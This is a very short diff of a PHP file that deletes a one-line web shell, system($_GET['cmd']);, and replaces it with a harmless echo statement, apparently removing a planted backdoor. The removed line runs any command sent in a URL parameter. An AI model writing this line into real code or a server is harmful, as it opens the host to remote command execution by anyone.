@@ -1,3 +1,3 @@
 <?php
-system($_GET['cmd']);
+echo 1;
 ?>
